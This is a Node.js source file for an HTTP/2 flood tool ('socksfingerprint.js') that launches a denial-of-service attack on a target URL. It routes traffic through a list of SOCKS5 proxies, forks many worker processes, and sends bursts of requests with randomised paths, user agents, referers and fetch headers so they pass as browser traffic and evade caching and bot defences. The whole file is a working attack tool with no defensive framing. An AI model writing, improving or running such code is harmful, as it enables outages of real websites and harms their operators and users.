const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node socksfingerprint.js target time rate thread proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    ""
];

// Новая функция работы с прокси — в стиле tlshttp1.js, но с SOCKS5
const Header = new class {
    SOCKS5(options, callback) {
        const proxyParts = options.proxy.split(':');
        const socksOptions = {
            proxy: {
                host: proxyParts[0],
                port: parseInt(proxyParts[1]),
                type: 5
            },
            command: 'connect',
            destination: {
                host: options.address.split(':')[0],
                port: parseInt(options.address.split(':')[1]) || 443
            },
            timeout: 10000
        };

        const client = SocksClient.createConnection(socksOptions, (err, info) => {
            if (err || !info) {
                return callback(null, "error");
            }

            const conn = info.socket;
            conn.setTimeout(10000);
            conn.setKeepAlive(true, 60000);

            conn.on("connect", () => {
                callback(conn, null);
            });

            conn.on("error", () => {
                conn.destroy();
                callback(null, "error");
            });

            conn.on("timeout", () => {
                conn.destroy();
                callback(null, "error");
            });
        });

        // Обработка ошибок на уровне клиента
        client.on("error", () => {
            callback(null, "error");
        });
    }
};

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) {
        headers["dnt"] = "1";
    }

    return headers;
}

function runFlooder() {
    const proxy = randomElement(proxies);
    if (!proxy || !proxy.includes(":")) return;

    const [phost, pport] = proxy.split(":");

    Header.SOCKS5({
        proxy: proxy,
        address: parsedTarget.host + ":443"
    }, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
            sigalgs: "ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512",
            curves: "X25519:P-256:P-384",
            ecdhCurve: "X25519:P-256:P-384",
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 30,
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 32000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.on("error", () => {
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        const closeAll = () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        };

        client.on("close", closeAll);
        client.on("error", closeAll);
        tlsConn.on("error", closeAll);
        tlsConn.on("end", closeAll);
        connection.on("close", closeAll);
        connection.on("error", closeAll);
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
